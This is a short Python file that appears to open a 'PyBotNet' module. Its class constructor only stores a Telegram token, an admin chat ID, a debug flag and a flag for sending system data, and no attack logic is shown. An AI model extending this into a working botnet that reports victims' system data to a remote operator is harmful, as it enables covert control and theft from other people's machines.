# import built-in & third-party modules

# import pybotnet modules
import util
import logging


class PyBotNet:

    def __init__(
        self,
        TELEGRAM_TOKEN,
        ADMIN_CHAT_ID,
        debug=False,
        send_system_data=True
    ) -> None:

        self.TELEGRAM_TOKEN = TELEGRAM_TOKEN
        self.ADMIN_CHAT_ID = ADMIN_CHAT_ID
        self.debug = debug
        self.send_system_data = send_system_data
